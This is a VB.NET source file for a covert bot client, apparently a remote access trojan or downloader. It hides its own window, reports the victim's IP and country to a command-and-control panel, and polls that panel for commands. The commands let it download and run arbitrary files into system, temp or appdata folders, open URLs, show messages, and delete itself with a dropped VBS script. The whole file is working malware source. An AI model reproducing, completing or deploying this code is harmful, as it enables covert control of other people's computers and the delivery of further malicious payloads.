Imports System.Text.RegularExpressions
Imports System.Net
Imports System.IO
Imports System.Text

Public Class Form1
    Dim w As New Net.WebClient
    Dim KURL As String = ""
    Dim ip As String = Regex.Match(w.DownloadString("https://api.ipify.org/?format=json"), "{""ip"":""(.*?)""}").Groups.Item(1).Value
    Dim cname As String = ""
    Dim country As String = Regex.Match(w.DownloadString("http://ip-api.com/php/" & ip), """country"";(.*?)""(.*?)"";").Groups.Item(2).Value
    Dim date1 As String = Today.Year & "/" & Today.Month & "/" & Today.Day
    Dim version As String = "v.1.0"
    Dim WithEvents client As New System.Net.WebClient()
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        Me.ShowIcon = False
        Me.ShowInTaskbar = False
        Dim result As String = w.DownloadString(KURL & "connect.php?connect&ip=" & ip & "&cname=" & cname & "&country=" & country & "&date=" & date1 & "&version=" & version)
        If result = "false" Then
            End
        End If
        Timer1.Start()
    End Sub
    Dim Download_Pattren As String = "download(""(.*?)"",""(.*?)"",""(.*?)"",""(.*?)"")"
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim GetCommandUrl As String = KURL & "getcl.php?i=" & ip
        Dim Result As String = w.DownloadString(GetCommandUrl).Replace("&lt;", "<").Replace("&gt;", ">")
        If Not Result = "NotFoundCommand" Then
            Timer1.Stop()
            Dim Spl() As String = Split(Result, "<command>")
            For i = 0 To Spl.Length - 2
                If Spl(i).Contains("download ") Then
                    Dim ID As String = Split(Spl(i), "-..-")(0)
                    Dim Final As String = Spl(i).Replace(ID & "-..-", Nothing)
                    Dim Values As String = Regex.Match(Final, "download ""(.*?)""").Groups.Item(1).Value
                    Dim splValues() As String = Split(Values, ",")
                    Dim UrlD As String = splValues(0)
                    Dim iG As String = splValues(1)
                    Dim InstallD As String = Nothing
                    Select Case iG
                        Case "%windir%"
                            InstallD = Environ("windir") & "\"
                        Case "%temp%"
                            InstallD = IO.Path.GetTempPath
                        Case "%appdata%"
                            InstallD = Environ("appdata") & "\"
                        Case "%samepath%"
                            InstallD = Application.StartupPath & "\"
                    End Select
                    Dim NameD As String = splValues(2)
                    Dim RunD As String = splValues(3)
                    download(UrlD, InstallD, NameD, RunD)
                    Threading.Thread.Sleep(200)
                    Dim res As String = w.DownloadString(KURL & "delcl.php?i=" & ip & "&id=" & ID)
                End If
                If Spl(i).Contains("msgbox ") Then
                    Dim ID As String = Split(Spl(i), "-..-")(0)
                    Dim Final As String = Spl(i).Replace(ID & "-..-", Nothing)
                    Dim Values As String = Regex.Match(Final, "msgbox ""(.*?)""").Groups.Item(1).Value
                    MsgBox(Values.Split(",")(0), MsgBoxStyle.Critical, Values.Split(",")(1))
                    Threading.Thread.Sleep(200)
                    Dim res As String = w.DownloadString(KURL & "delcl.php?i=" & ip & "&id=" & ID)
                End If
                If Spl(i).Contains("openurl ") Then
                    Dim ID As String = Split(Spl(i), "-..-")(0)
                    Dim Final As String = Spl(i).Replace(ID & "-..-", Nothing)
                    Dim Values As String = Regex.Match(Final, "openurl ""(.*?)""").Groups.Item(1).Value
                    Process.Start(Values)
                    Threading.Thread.Sleep(200)
                    Dim res As String = w.DownloadString(KURL & "delcl.php?i=" & ip & "&id=" & ID)
                End If
                If Spl(i).Contains("close") Then
                    Dim ID As String = Split(Spl(i), "-..-")(0)
                    Dim Final As String = Spl(i).Replace(ID & "-..-", Nothing)
                    Threading.Thread.Sleep(200)
                    Dim res As String = w.DownloadString(KURL & "delcl.php?i=" & ip & "&id=" & ID)
                    End
                End If
                If Spl(i).Contains("uninstall") Then
                    Dim ID As String = Split(Spl(i), "-..-")(0)
                    Dim Final As String = Spl(i).Replace(ID & "-..-", Nothing)
                    Threading.Thread.Sleep(200)
                    Dim res As String = w.DownloadString(KURL & "delcl.php?i=" & ip & "&id=" & ID)
                    Dim FilePath As String = Application.ExecutablePath
                    Dim VileString As String = "on error resume next" _
                                               & vbNewLine & "Dim oShell : Set oShell = CreateObject(""WScript.Shell"")" _
                                               & vbNewLine & "oShell.Run ""taskkill /im " & IO.Path.GetFileName(FilePath) & """, , True" _
                                               & vbNewLine & "dim filesys" _
                                               & vbNewLine & "Set filesys = CreateObject(""Scripting.FileSystemObject"")" _
                                               & vbNewLine & "If filesys.FileExists(""" & FilePath & """) Then" _
                                               & vbNewLine & "    WScript.Sleep 3000" _
                                               & vbNewLine & "    filesys.DeleteFile """ & FilePath & """" _
                                               & vbNewLine & "End If"
                    IO.File.WriteAllText(IO.Path.GetTempPath & "removefile.vbs", VileString)
a:
                    If File.Exists(IO.Path.GetTempPath & "removefile.vbs") Then
                        Threading.Thread.Sleep(2000)
                        Process.Start(IO.Path.GetTempPath & "removefile.vbs")
                    Else
                        GoTo a
                    End If
                End If
            Next
            Timer1.Start()
        End If
    End Sub
    Function download(UrlD As String, InstallD As String, NameD As String, RunD As String) As String
        On Error Resume Next
        If IO.File.Exists(InstallD & NameD) Then
            IO.File.Delete(InstallD & NameD)
        End If
        w.DownloadFile(UrlD, InstallD & NameD)
        If RunD = "1" Then
            Process.Start(InstallD & NameD)
        End If
        Return ""
    End Function
End Class
